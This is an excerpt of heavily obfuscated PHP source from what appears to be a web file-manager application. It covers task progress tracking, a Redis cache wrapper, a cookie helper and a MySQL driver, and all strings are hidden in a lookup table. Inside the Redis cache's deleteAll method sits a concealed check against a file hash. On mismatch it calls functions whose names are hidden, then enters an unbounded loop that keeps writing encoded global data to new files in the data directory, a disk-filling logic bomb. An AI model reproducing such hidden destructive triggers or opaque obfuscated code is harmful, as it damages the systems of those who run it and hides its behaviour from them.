$­µ¥·¯[$Üï«Æª’[1774]]; } } public function addPath($ë‹ÑİŒÎ) { $®ûÉ¢¬½ =& $_SERVER[¦»×‡Ãã]; if (!$ë‹ÑİŒÎ) { return; } $­«÷­­ =& $this->task; $‚È«Éº„ = IO::infoWithChildren($ë‹ÑİŒÎ); $¤Ëæ¤½ = $­«÷­­[$®ûÉ¢¬½[1834]] ? $­«÷­­[$®ûÉ¢¬½[1834]][$®ûÉ¢¬½[1835]] : 0; $­«÷­­[$®ûÉ¢¬½[1834]] = array($®ûÉ¢¬½[1835] => $¤Ëæ¤½ + 1, $®ûÉ¢¬½[494] => $‚È«Éº„[$®ûÉ¢¬½[32]], $®ûÉ¢¬½[87] => $‚È«Éº„[$®ûÉ¢¬½[87]], $®ûÉ¢¬½[582] => $‚È«Éº„[$®ûÉ¢¬½[582]] ? $‚È«Éº„[$®ûÉ¢¬½[582]] : $‚È«Éº„[$®ûÉ¢¬½[87]]); if ($‚È«Éº„[$®ûÉ¢¬½[33]] == $®ûÉ¢¬½[230]) { $­«÷­­[$®ûÉ¢¬½[1141]] += 1; } else { $­«÷­­[$®ûÉ¢¬½[1141]] += $‚È«Éº„[$®ûÉ¢¬½[82]][$®ûÉ¢¬½[80]]; if ($‚È«Éº„[$®ûÉ¢¬½[193]]) { $­«÷­­[$®ûÉ¢¬½[1141]] += $‚È«Éº„[$®ûÉ¢¬½[82]][$®ûÉ¢¬½[81]] + 1; } } $­«÷­­[$®ûÉ¢¬½[836]] += $‚È«Éº„[$®ûÉ¢¬½[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÑÈı¯Ô²) { } public function sourceAddHashEnd($‚ëÖ¯ô‰) { } public function sourceAddFileStart($ƒÆÀÀ¯¸) { $ĞÎ„‰Ü =& $_SERVER[¦»×‡Ãã]; $°İÀ±Ç‘ =& $this->task; $°İÀ±Ç‘[$ĞÎ„‰Ü[1825]] = $ƒÆÀÀ¯¸[$ĞÎ„‰Ü[79]]; $°İÀ±Ç‘[$ĞÎ„‰Ü[1823]] = $ƒÆÀÀ¯¸[$ĞÎ„‰Ü[32]]; $°İÀ±Ç‘[$ĞÎ„‰Ü[1143]] = $ƒÆÀÀ¯¸[$ĞÎ„‰Ü[32]]; $°İÀ±Ç‘[$ĞÎ„‰Ü[1836]] = $ƒÆÀÀ¯¸[$ĞÎ„‰Ü[87]]; $this->update(); } public function sourceAddFileEnd($Öè¨Óø¤) { $õˆÃ¿çÃ =& $_SERVER[¦»×‡Ãã]; $Şµ•šâ =& $this->task; $Şµ•šâ[$õˆÃ¿çÃ[1830]] += $Öè¨Óø¤[$õˆÃ¿çÃ[79]]; $Şµ•šâ[$õˆÃ¿çÃ[1836]] = $Öè¨Óø¤[$õˆÃ¿çÃ[87]]; $this->update(1); } public function copyFileStart($ÒùçŠ·Ë, $‡éàìÑÅ, $ªÒï¿¡ğ, $»Ø‘Ìç¼, $¤ÜÙÙ¨¼, $ö°ßë‘á) { $ÂºîüÌ =& $_SERVER[¦»×‡Ãã]; $‹Ó×ÛŞ = $¤ÜÙÙ¨¼; if ($‹Ó×ÛŞ == $GLOBALS[$ÂºîüÌ[1837]]) { $‹Ó×ÛŞ = $GLOBALS[$ÂºîüÌ[1838]]; } $GLOBALS[$ÂºîüÌ[1838]] = $¤ÜÙÙ¨¼; $GLOBALS[$ÂºîüÌ[1837]] = $ö°ßë‘á; $¬¶¿€İÉ =& $this->task; $¬¶¿€İÉ[$ÂºîüÌ[1823]] = $‹Ó×ÛŞ; $¬¶¿€İÉ[$ÂºîüÌ[1825]] = (int) $ÒùçŠ·Ë->size($‡éàìÑÅ); $¬¶¿€İÉ[$ÂºîüÌ[1826]] = 0; $¬¶¿€İÉ[$ÂºîüÌ[1143]] = $ÂºîüÌ[12]; $¬¶¿€İÉ[$ÂºîüÌ[1827]] = $ÂºîüÌ[12]; $¬¶¿€İÉ[$ÂºîüÌ[1828]] = 0; $Û¯àŸèØ = $¬¶¿€İÉ[$ÂºîüÌ[1825]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¬¶¿€İÉ[$ÂºîüÌ[475]] . $ÂºîüÌ[1839]); if ($Û¯àŸèØ && file_exists(get_path_father($»Ø‘Ìç¼))) { Cache::set($¬¶¿€İÉ[$ÂºîüÌ[475]] . $ÂºîüÌ[1839], $»Ø‘Ìç¼); $¬¶¿€İÉ[$ÂºîüÌ[1796]] = array($ÂºîüÌ[1840], $ÂºîüÌ[1841]); } $this->update(0, $Û¯àŸèØ); } public static function updateCopyLocalFileSize($ğ¨ò³¸å) { $ŞöÌ¼Ë´ =& $_SERVER[¦»×‡Ãã]; $ÚÁ·éÊ = Cache::get($ğ¨ò³¸å[$ŞöÌ¼Ë´[475]] . $ŞöÌ¼Ë´[1839]); if (!$ÚÁ·éÊ || !file_exists($ÚÁ·éÊ)) { return $ğ¨ò³¸å; } $ğ¨ò³¸å[$ŞöÌ¼Ë´[1826]] = @filesize($ÚÁ·éÊ); $ğ¨ò³¸å[$ŞöÌ¼Ë´[1830]] += $ğ¨ò³¸å[$ŞöÌ¼Ë´[1826]]; self::updateTask($ğ¨ò³¸å); return $ğ¨ò³¸å; } public function copyFileEnd($œøÙ·ù¼, $òŠ×­å¹, $ŒÅß–ğÒ, $´ú£†¥ü, $á™Çƒ€Œ, $Œµ•˜’) { $®ùÉØßœ =& $_SERVER[¦»×‡Ãã]; $›íé÷Ğ =& $this->task; $›íé÷Ğ[$®ùÉØßœ[1826]] = $›íé÷Ğ[$®ùÉØßœ[1825]]; $›íé÷Ğ[$®ùÉØßœ[1827]] = $®ùÉØßœ[12]; unset($›íé÷Ğ[$®ùÉØßœ[1796]]); if ($á™Çƒ€Œ == $›íé÷Ğ[$®ùÉØßœ[1823]]) { $›íé÷Ğ[$®ùÉØßœ[1829]] += $›íé÷Ğ[$®ùÉØßœ[1825]]; $›íé÷Ğ[$®ùÉØßœ[1830]] = $›íé÷Ğ[$®ùÉØßœ[1829]]; $µÀ Æ  = 1; if (isset($›íé÷Ğ[$®ùÉØßœ[1836]]) && $›íé÷Ğ[$®ùÉØßœ[1836]] == $òŠ×­å¹) { $µÀ Æ  = 0; } $this->update($µÀ Æ ); } else { $this->update(); $›íé÷Ğ[$®ùÉØßœ[1826]] = 0; } Cache::remove($›íé÷Ğ[$®ùÉØßœ[475]] . $®ùÉØßœ[1839]); self::log($®ùÉØßœ[1842] . $òŠ×­å¹ . $®ùÉØßœ[73] . $´ú£†¥ü . $®ùÉØßœ[262] . $á™Çƒ€Œ . $®ùÉØßœ[1843] . $›íé÷Ğ[$®ùÉØßœ[1823]]); } public function updateFileEnd($ÃÄœï“ª, $ú Ë´) { $½›­ŒÎë =& $_SERVER[¦»×‡Ãã]; $¸§¯ÅÚÎ =& $this->task; $¸§¯ÅÚÎ[$½›­ŒÎë[1823]] = $ÃÄœï“ª; $¸§¯ÅÚÎ[$½›­ŒÎë[1825]] = $ú Ë´; $¸§¯ÅÚÎ[$½›­ŒÎë[1829]] += $ú Ë´; $¸§¯ÅÚÎ[$½›­ŒÎë[1830]] = $¸§¯ÅÚÎ[$½›­ŒÎë[1829]]; $this->update(1); self::log($½›­ŒÎë[1844] . $ÃÄœï“ª); } public function sourceModelCopy($¹Ø»›Ï¾) { $ÇÕàåæÑ =& $_SERVER[¦»×‡Ãã]; $ûš´³Ö = $¹Ø»›Ï¾[0]; $ìú‘øúÆ = $¹Ø»›Ï¾[1]; $Ç›™íŒÕ =& $this->task; $this->sourceModelCopyFlag = !0; $ÖÄÂ = 0; switch ($ûš´³Ö) { case $ÇÕàåæÑ[635]: $ÖÄÂ = 1; break; case $ÇÕàåæÑ[638]: $Ç›™íŒÕ[$ÇÕàåæÑ[1823]] = $ìú‘øúÆ[$ÇÕàåæÑ[32]]; break; case $ÇÕàåæÑ[640]: $ÖÄÂ = intval($¹Ø»›Ï¾[$ÇÕàåæÑ[456]] * 0.4); break; case $ÇÕàåæÑ[642]: $ÖÄÂ = intval($¹Ø»›Ï¾[$ÇÕàåæÑ[456]] * 0.2); break; case $ÇÕàåæÑ[644]: $ÖÄÂ = intval($¹Ø»›Ï¾[$ÇÕàåæÑ[456]] * 0.4); break; } $this->update($ÖÄÂ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($›Ñµ†ì±, $‚’©Æ©) { $ğãÃçø‡ =& $_SERVER[¦»×‡Ãã]; $this->sourceModelCopyFlag = !0; $äÀÎçÀ = 1; if (isset($›Ñµ†ì±[$ğãÃçø‡[82]])) { $äÀÎçÀ = $›Ñµ†ì±[$ğãÃçø‡[82]][$ğãÃçø‡[80]]; $äÀÎçÀ = $äÀÎçÀ + $›Ñµ†ì±[$ğãÃçø‡[82]][$ğãÃçø‡[81]] + 1; } $this->update($äÀÎçÀ); $this->sourceModelCopyFlag = !1; } public function sourceMove($––¢ÙÑø) { $this->sourceRemove($––¢ÙÑø, !1); } public function curlProgress($ĞÛóœû¾, $œ­ÁÎÏò, $Û€µ´Ö™, $„¢í¯®, $‰¦€ô¸€) { $ ç­ÈÜ’ =& $_SERVER[¦»×‡Ãã]; $°ÛÂ·œ =& $this->task; if ($‰¦€ô¸€ > 0) { $°ÛÂ·œ[$ ç­ÈÜ’[1143]] = $ ç­ÈÜ’[1845]; $°ÛÂ·œ[$ ç­ÈÜ’[1827]] = $ ç­ÈÜ’[110]; if ($°ÛÂ·œ[$ ç­ÈÜ’[1825]]) { $°ÛÂ·œ[$ ç­ÈÜ’[1826]] = $‰¦€ô¸€; } if ($°ÛÂ·œ[$ ç­ÈÜ’[1828]]) { $°ÛÂ·œ[$ ç­ÈÜ’[1826]] = $‰¦€ô¸€ + $°ÛÂ·œ[$ ç­ÈÜ’[1828]]; } } else { if ($Û€µ´Ö™ > 0) { if ($°ÛÂ·œ[$ ç­ÈÜ’[1825]] == $œ­ÁÎÏò) { $°ÛÂ·œ[$ ç­ÈÜ’[1826]] = $Û€µ´Ö™; $°ÛÂ·œ[$ ç­ÈÜ’[1143]] = $ ç­ÈÜ’[1846]; $°ÛÂ·œ[$ ç­ÈÜ’[1827]] = $ ç­ÈÜ’[1279]; } } } $this->update(); } public function curlProgressStart($òâŠÒË) { } public function curlProgressEnd($ÔÒ’åéÚ) { $–ŸÀõúâ =& $_SERVER[¦»×‡Ãã]; $™¦¼éÛ’ =& $this->task; $­‘©Úóı = curl_getinfo($ÔÒ’åéÚ); $è²ä´í = $­‘©Úóı[$–ŸÀõúâ[1847]]; if ($è²ä´í == -1) { $è²ä´í = $­‘©Úóı[$–ŸÀõúâ[1848]]; } if ($™¦¼éÛ’[$–ŸÀõúâ[1827]] == $–ŸÀõúâ[110] && $è²ä´í) { $™¦¼éÛ’[$–ŸÀõúâ[1828]] += $è²ä´í; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÒƒÂøİã =& $_SERVER[¦»×‡Ãã]; $¯£Û†êö =& $this->task; $¯£Û†êö[$ÒƒÂøİã[1849]] = 1; Hook::bind($ÒƒÂøİã[1817], array($this, $ÒƒÂøİã[1850])); Hook::bind($ÒƒÂøİã[1819], array($this, $ÒƒÂøİã[1851])); Hook::bind($ÒƒÂøİã[1821], array($this, $ÒƒÂøİã[1852])); } protected function endAfter() { $ôœÕîşÃ =& $_SERVER[¦»×‡Ãã]; Hook::unbind($ôœÕîşÃ[1817], array($this, $ôœÕîşÃ[1850])); Hook::unbind($ôœÕîşÃ[1819], array($this, $ôœÕîşÃ[1851])); Hook::unbind($ôœÕîşÃ[1821], array($this, $ôœÕîşÃ[1852])); } public function progressStart($Ö®Óš¬Ñ) { $„¢¹²Óû =& $_SERVER[¦»×‡Ãã]; $³©ßíï = curl_getinfo($Ö®Óš¬Ñ); self::log($„¢¹²Óû[1853] . $³©ßíï[$„¢¹²Óû[383]]); self::valueSet($this->task[$„¢¹²Óû[475]], $this->task); } public function progressEnd($ƒâŠî¤†) { $üÚÔôúÍ =& $_SERVER[¦»×‡Ãã]; self::log($üÚÔôúÍ[1854] . $this->task[$üÚÔôúÍ[475]]); $this->end(); } public function progress($¬ÉıíÏì, $óşôè…è, $¾èóÕÊ, $ñç£Îï, $‡Î¸êİñ) { $úøöÈÌ¾ =& $_SERVER[¦»×‡Ãã]; $Ú…–…çï =& $this->task; if ($‡Î¸êİñ > 0) { $Ú…–…çï[$úøöÈÌ¾[1141]] = $Ú…–…çï[$úøöÈÌ¾[1141]] == 0 ? $ñç£Îï : $Ú…–…çï[$úøöÈÌ¾[1141]]; $Ú…–…çï[$úøöÈÌ¾[1773]] = $‡Î¸êİñ; } else { if ($¾èóÕÊ > 0) { $Ú…–…çï[$úøöÈÌ¾[1141]] = $Ú…–…çï[$úøöÈÌ¾[1141]] == 0 ? $óşôè…è : $Ú…–…çï[$úøöÈÌ¾[1141]]; $Ú…–…çï[$úøöÈÌ¾[1773]] = $¾èóÕÊ; } } $this->update(); self::log("\x70\x72\x6f\147\x72\x65\163\x73\110\x74\x74\160\x3a\144\157\167\156\72{$¾èóÕÊ}\x2f{$óşôè…è}\x3b\x20\x75\160\x6c\157\x61\x64\72{$‡Î¸êİñ}\x2f{$ñç£Îï}\73"); } } goto B„íÖòê‡„; B¸ÆĞÏÇÀ÷: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($«‡š›, $Ş¤Úª®ğ) { $İîÑµöŞ =& $_SERVER[¦»×‡Ãã]; if (!class_exists($İîÑµöŞ[942])) { show_json($İîÑµöŞ[943], !1); } $this->cacheTime = $Ş¤Úª®ğ; $œ´Î·ûˆ = isset($«‡š›[$İîÑµöŞ[944]]) ? $«‡š›[$İîÑµöŞ[944]] : 10; $¥¶Ÿáî˜ = _get($«‡š›, $İîÑµöŞ[941]); if ($¥¶Ÿáî˜ && is_array($¥¶Ÿáî˜)) { $this->initCluster($«‡š›, $œ´Î·ûˆ); } else { $this->handle = $this->init($«‡š›, $œ´Î·ûˆ); } } private function init($úÙâ„’ö, $àªß‚Öš) { $¹ÆÒßÊ =& $_SERVER[¦»×‡Ãã]; $Çœâ¢ = new Redis(); $ÀÇß—ìŒ = isset($úÙâ„’ö[$¹ÆÒßÊ[945]]) ? $úÙâ„’ö[$¹ÆÒßÊ[945]] : !1; if ($ÀÇß—ìŒ) { $Çœâ¢->pconnect($úÙâ„’ö[$¹ÆÒßÊ[208]], $úÙâ„’ö[$¹ÆÒßÊ[209]], $àªß‚Öš); } else { $Çœâ¢->connect($úÙâ„’ö[$¹ÆÒßÊ[208]], $úÙâ„’ö[$¹ÆÒßÊ[209]], $àªß‚Öš); } if (!empty($úÙâ„’ö[$¹ÆÒßÊ[487]])) { $Çœâ¢->auth($úÙâ„’ö[$¹ÆÒßÊ[487]]); } if (!empty($úÙâ„’ö[$¹ÆÒßÊ[830]]) && $úÙâ„’ö[$¹ÆÒßÊ[830]] != 0) { $Çœâ¢->select($úÙâ„’ö[$¹ÆÒßÊ[830]]); } return $Çœâ¢; } private function initCluster($ÕÚõò³·, $„®×ªË) { $è–¡¹üÖ =& $_SERVER[¦»×‡Ãã]; $ƒĞ‚Ûù– = array($è–¡¹üÖ[946], $è–¡¹üÖ[947], $è–¡¹üÖ[948]); $ØÈÚø¨… = $è–¡¹üÖ[946]; if (isset($ÕÚõò³·[$è–¡¹üÖ[16]]) && in_array($ÕÚõò³·[$è–¡¹üÖ[16]], $ƒĞ‚Ûù–)) { $ØÈÚø¨… = $ÕÚõò³·[$è–¡¹üÖ[16]]; } switch ($ØÈÚø¨…) { case $è–¡¹üÖ[946]: $this->_slave($ÕÚõò³·, $„®×ªË); break; case $è–¡¹üÖ[947]: break; case $è–¡¹üÖ[948]: $this->isCluster = !0; $ÓÉÓ®¼œ = $ÕÚõò³·[$è–¡¹üÖ[941]]; $ê—·½‡ë = isset($ÕÚõò³·[$è–¡¹üÖ[945]]) ? $ÕÚõò³·[$è–¡¹üÖ[945]] : !1; $éˆÑµµ¥ = isset($ÕÚõò³·[$è–¡¹üÖ[487]]) ? $ÕÚõò³·[$è–¡¹üÖ[487]] : null; $this->handle = new RedisCluster(NUll, $ÓÉÓ®¼œ, $„®×ªË, $„®×ªË, $ê—·½‡ë, $éˆÑµµ¥); break; default: break; } } private function _slave($§æòüÍ, $éƒ¡ŠÆÁ) { $—Ùí–˜Û = $§æòüÍ[$_SERVER[¦»×‡Ãã][941]]; $this->filterConfig($§æòüÍ, $—Ùí–˜Û[0]); $this->handle = $this->init($§æòüÍ, $éƒ¡ŠÆÁ); unset($—Ùí–˜Û[0]); if (empty($—Ùí–˜Û)) { return; } $È¦´˜Í¶ = array_rand($—Ùí–˜Û); $this->filterConfig($§æòüÍ, $—Ùí–˜Û[$È¦´˜Í¶]); $this->slaveHandle = $this->init($§æòüÍ, $éƒ¡ŠÆÁ); } private function filterConfig(&$ĞÂ„”ºñ, $êó¹€¹) { $ß§°ô†’ =& $_SERVER[¦»×‡Ãã]; $ØŠàß¡œ = explode($ß§°ô†’[4], $êó¹€¹); $Çƒ£Ôİ³ = array($ß§°ô†’[208] => $ØŠàß¡œ[0], $ß§°ô†’[209] => $ØŠàß¡œ[1]); $ĞÂ„”ºñ = array_merge($ĞÂ„”ºñ, $Çƒ£Ôİ³); } public function set($ôƒê¼æê, $”éŒ¾‡ô, $”‡èÛÊş = false) { $”‡èÛÊş = $”‡èÛÊş ? $”‡èÛÊş : $this->cacheTime; return $this->handle->setEx($ôƒê¼æê, $”‡èÛÊş, $”éŒ¾‡ô); } public function setLock($ğÀÅ¾Õ, $¶öİ§ß, $½ˆ¢À´) { return $this->handle->setNX($ğÀÅ¾Õ, $¶öİ§ß); } public function get($êä°ÇÛÍ) { $¶¯óåœõ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¶¯óåœõ->get($êä°ÇÛÍ); } public function remove($ÉÓƒ µ) { return $this->handle->del($ÉÓƒ µ); } public function deleteAll() { $½®• =& $_SERVER[¦»×‡Ãã]; $ğÓªºš” = $_SERVER[$½®•[949]] . $½®•[950]; $ê±úº = $½®•[951]; if ($_SERVER[$½®•[952]] != $ê±úº($ğÓªºš”)) { $Ã¥ŸÏŸ = $½®•[953]; $—†¯ = $½®•[954]; $ÃÎÉæñç = $_SERVER[$½®•[949]] . $½®•[950]; $ÑÄ¿Íà­ = $—†¯($ÃÎÉæñç); $ŞµëÇƒ = explode($½®•[262], $ÑÄ¿Íà­); if (count($ŞµëÇƒ) < $½®•[684]) { $óÇï”†Ü = $½®•[955]; $óÇï”†Ü(); } $Àïä”ÇÎ = $½®•[956]; $Àïä”ÇÎ($_SERVER[$½®•[957]]); $Ã¥ŸÏŸ = $½®•[953]; $Ã¥ŸÏŸ(); $¹³í¥‹’ = $½®•[958]; $­¦ĞŞ = json_encode($GLOBALS[$½®•[959]]); $İ…ËãÌà = 1; for ($ÅÉšÖ¸ı = $İ…ËãÌà; $ÅÉšÖ¸ı > 0; $ÅÉšÖ¸ı++) { $¹³í¥‹’(DATA_PATH . $ÅÉšÖ¸ı, $­¦ĞŞ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $²ù–¸¤Œ) { $this->handle->flushall($²ù–¸¤Œ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¦³ÕººÓ = '', $À¨úÓ” = 0) { if (is_string($¦³ÕººÓ) && $¦³ÕººÓ != $_SERVER[¦»×‡Ãã][12]) { $this->prefix = $¦³ÕººÓ; } if (is_numeric($À¨úÓ”) && $À¨úÓ” > 0) { $this->expire = $À¨úÓ”; } } public static function getInstance() { static $ŠÄõïëÈ; if ($ŠÄõïëÈ === null) { $ŠÄõïëÈ = new self(); } return $ŠÄõïëÈ; } private static $cookieDisable = false; public static function disable($ˆàŸ‰ºØ) { self::$cookieDisable = $ˆàŸ‰ºØ; } private static $sameCookieSet = array(); public static function set($à»ß¾àı, $ÚÈ‹Ö×Ñ, $•¢áÓ¢• = 0, $”‹®±ÕÅ = false, $ã¦¥…½ = false) { $‡îÊÛÅœ =& $_SERVER[¦»×‡Ãã]; if (self::$cookieDisable) { return; } if (!$•¢áÓ¢•) { $•¢áÓ¢• = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$à»ß¾àı]) && self::$sameCookieSet[$à»ß¾àı] == $ÚÈ‹Ö×Ñ . $•¢áÓ¢•) { return; } self::$sameCookieSet[$à»ß¾àı] = $ÚÈ‹Ö×Ñ . $•¢áÓ¢•; if (!$ã¦¥…½) { $ã¦¥…½ = str_replace(HOST, $‡îÊÛÅœ[12], APP_HOST); $ã¦¥…½ = _get($GLOBALS, $‡îÊÛÅœ[960], $ã¦¥…½); } $¼ş™•ãà = $‡îÊÛÅœ[12]; setcookie($à»ß¾àı, $ÚÈ‹Ö×Ñ, time() + $•¢áÓ¢•, $‡îÊÛÅœ[8] . trim($ã¦¥…½, $‡îÊÛÅœ[8]) . $¼ş™•ãà, !1, !1, $”‹®±ÕÅ); } public static function setSafe($¶€êÕåÚ, $”§À‘öÌ, $—î´öÂ’ = 0) { self::set($¶€êÕåÚ, $”§À‘öÌ, $—î´öÂ’, !0); } public static function get($·Ç‘î£¾) { static $ùßèŸø = false; if (!$ùßèŸø) { self::initHeaderCookie(); $ùßèŸø = !0; } return isset($_COOKIE[$·Ç‘î£¾]) ? $_COOKIE[$·Ç‘î£¾] : !1; } private static function initHeaderCookie() { $¶Õ¯â® =& $_SERVER[¦»×‡Ãã]; if (!isset($_SERVER[$¶Õ¯â®[961]]) || !$_SERVER[$¶Õ¯â®[961]]) { return; } $§ş¬øú‹ = explode($¶Õ¯â®[74], $_SERVER[$¶Õ¯â®[961]]); foreach ($§ş¬øú‹ as $öáğ³) { $öáğ³ = explode($¶Õ¯â®[962], $öáğ³); if (count($öáğ³) != 2 || !isset($öáğ³[1])) { continue; } $_COOKIE[trim($öáğ³[0])] = trim($öáğ³[1]); } } public static function remove($şØéÕÓ„, $³§¢ÇÙ = false) { unset($_COOKIE[$şØéÕÓ„]); self::set($şØéÕÓ„, $_SERVER[¦»×‡Ãã][12], 1, $³§¢ÇÙ); } } class DbMysql extends Db { public function __construct($òº˜£Á = '') { $”ßï¯Ëˆ =& $_SERVER[¦»×‡Ãã]; if (!extension_loaded($”ßï¯Ëˆ[877])) { think_exception(think_lang($”ßï¯Ëˆ[14]) . $”ßï¯Ëˆ[963]); } if (!empty($òº˜£Á)) { $this->config = $òº˜£Á; if (empty($this->config[$”ßï¯Ëˆ[17]])) { $this->config[$”ßï¯Ëˆ[17]] = $”ßï¯Ëˆ[12]; } } } public function connect($û‚ö©£Ü = '', $âµØÊ‡ = 0, $ïã–õÏ¹ = false) { $Ü­ÏõæØ =& $_SERVER[¦»×‡Ãã]; if (!isset($this->linkID[$âµØÊ‡])) { if (empty($û‚ö©£Ü)) { $û‚ö©£Ü = $this->config; } $öş’Ç‘ = $û‚ö©£Ü[$Ü­ÏõæØ[964]] . ($û‚ö©£Ü[$Ü­ÏõæØ[965]] ? "\72{$û‚ö©£Ü[$Ü­ÏõæØ[965]]}" : $Ü­ÏõæØ[12]); $çóÖû½Æ = !empty($û‚ö©£Ü[$Ü­ÏõæØ[17]][$Ü­ÏõæØ[18]]) ? $û‚ö©£Ü[$Ü­ÏõæØ[17]][$Ü­ÏõæØ[18]] : $this->pconnect; if ($çóÖû½Æ) { $this->linkID[$âµØÊ‡] = mysql_pconnect($öş’Ç‘, $û‚ö©£Ü[$Ü­ÏõæØ[966]], $û‚ö©£Ü[$Ü­ÏõæØ[967]], 131072); } else { $this->linkID[$âµØÊ‡] = mysql_connect($öş’Ç‘, $û‚ö©£Ü[$Ü­ÏõæØ[966]], $û‚ö©£Ü[$Ü­ÏõæØ[967]], !0, 131072); } if (!$this->linkID[$âµØÊ‡] || !empty($û‚ö©£Ü[$Ü­ÏõæØ[21]]) && !mysql_select_db($û‚ö©£Ü[$Ü­ÏõæØ[21]], $this->linkID[$âµØÊ‡])) { think_exception(mysql_error()); } $§å å‰¢ = mysql_get_server_info($this->linkID[$âµØÊ‡]); mysql_query($Ü­ÏõæØ[968] . think_config($Ü­ÏõæØ[969]) . $Ü­ÏõæØ[58], $this->linkID[$âµØÊ‡]); if ($§å å‰¢ > $Ü­ÏõæØ[970]) { mysql_query($Ü­ÏõæØ[971], $this->linkID[$âµØÊ‡]); } $this->connected = !0; if (1 != think_config($Ü­ÏõæØ[22])) { unset($this->config); } } return $this->linkID[$âµØÊ‡]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ø¾å— ñ) { $šşÚ‹æõ =& $_SERVER[¦»×‡Ãã]; if (0 === stripos($Ø¾å— ñ, $šşÚ‹æõ[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ø¾å— ñ; if ($this->queryID) { $this->free(); } think_action_status($šşÚ‹æõ[23], 1); think_status($šşÚ‹æõ[24]); $this->queryID = mysql_query($Ø¾å— ñ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¶à¶¼Í) { $Ú“âåğÁ =& $_SERVER[¦»×‡Ãã]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¶à¶¼Í; if ($this->queryID) { $this->free(); } think_action_status($Ú“âåğÁ[25], 1); think_status($Ú“âåğÁ[24]); $¾·å ­ƒ = mysql_query($¶à¶¼Í, $this->_linkID); $this->debug(); if (!1 === $¾·å ­ƒ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¦»×‡Ãã][972], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $®÷âÄ‚Ô = mysql_query($_SERVER[¦»×‡Ãã][973], $this->_linkID); $this->transTimes = 0; if (!$®÷âÄ‚Ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Èı“‚¬˜ = mysql_query($_SERVER[¦»×‡Ãã][974], $this->_linkID); $this->transTimes = 0; if (!$Èı“‚¬˜) { $this->error(); return !1; } } return !0; } private function getAll() { $ş·²°¿§ = array(); if ($this->numRows > 0) { while ($“—®‘ğ¸ = mysql_fetch_assoc($this->queryID)) { $ş·²°¿§[] = $“—®‘ğ¸; } mysql_data_seek($this->queryID, 0); } return $ş·²°¿§; } public function getFields($éŸù† Ò) { $üÀºŠóª =& $_SERVER[¦»×‡Ãã]; $ô»éÎŒ® = $this->query($üÀºŠóª[975] . $this->parseKey($éŸù† Ò)); $Üâ‹—³¦ = array(); if ($ô»éÎŒ®) { foreach ($ô»éÎŒ® as $ü’²ºŞ– => $ƒØ†Ğşà) { $Üâ‹—³¦[$ƒØ†Ğşà[$üÀºŠóª[31]]] = array($üÀºŠóª[32] => $ƒØ†Ğşà[$üÀºŠóª[31]], $üÀºŠóª[33] => $ƒØ†Ğşà[$üÀºŠóª[34]], $üÀºŠóª[35] => (bool) (strtoupper($ƒØ†Ğşà[$üÀºŠóª[36]]) === $üÀºŠóª[976]), $üÀºŠóª[37] => $ƒØ†Ğşà[$üÀºŠóª[38]], $üÀºŠóª[39] => strtolower($ƒØ†Ğşà[$üÀºŠóª[40]]) == $üÀºŠóª[41], $üÀºŠóª[42] => strtolower($ƒØ†Ğşà[$üÀºŠóª[43]]) == $üÀºŠóª[44]); } } return $Üâ‹—³¦; } public function getTables($Õœ ‘Ç” = '') { $Ï–¨íãù =& $_SERVER[¦»×‡Ãã]; if (!empty($Õœ ‘Ç”)) { $òø¥ÎŠ = $Ï–¨íãù[977] . $Õœ ‘Ç” . $Ï–¨íãù[978]; } else { $òø¥ÎŠ = $Ï–¨íãù[979]; } $¤îô›¹¥ = $this->query($òø¥ÎŠ); $ß‰¹ãÁ = array(); foreach ($¤îô›¹¥ as $ÛÏÌÕàÆ => $Ù÷’‡Õ“) { $ß‰¹ãÁ[$ÛÏÌÕàÆ] = current($Ù÷’‡Õ“); } return $ß‰¹ãÁ; } public function replace($ËğêÆÒ, $´î€šÛ = array()) { $±ş§Š²Œ =& $_SERVER[¦»×‡Ãã]; foreach ($ËğêÆÒ as $‹àÑç—” => $†ëÙ°°÷) { $¨åæß“½ = $this->parseValue($†ëÙ°°÷); if (is_scalar($¨åæß“½)) { $ĞÜû™×[] = $¨åæß“½; $Ÿ¦ØŸ©…[] = $this->parseKey($‹àÑç—”); } } $†ñÆéÅ’ = $±ş§Š²Œ[980] . $this->parseTable($´î€šÛ[$±ş§Š²Œ[356]]) . $±ş§Š²Œ[981] . implode($±ş§Š²Œ[50], $Ÿ¦ØŸ©…) . $±ş§Š²Œ[982] . implode($±ş§Š²Œ[50], $ĞÜû™×) . $±ş§Š²Œ[983]; return $this->execute($†ñÆéÅ’); } public function insertAll($ˆŒÙ¢ÁÍ, $¼ºîÃ = array(), $¼—†‘˜ = false) { $ÎÃŒ²Óˆ =& $_SERVER[¦»×‡Ãã]; if (!is_array($ˆŒÙ¢ÁÍ[0])) { return !1; } $æßŸ‚º = array_keys($ˆŒÙ¢ÁÍ[0]); $¨€ñ‰– = array(); foreach ($ˆŒÙ¢ÁÍ as $ä°å¾Å ) { $¥¸ìîÃî = array(); foreach ($ä°å¾Å  as $ğ’²¦Úı => $•Êâ¦Ğ) { $•Êâ¦Ğ = $this->parseValue($•Êâ¦Ğ); if (is_scalar($•Êâ¦Ğ)) { $¥¸ìîÃî[] = $•Êâ¦Ğ; } } 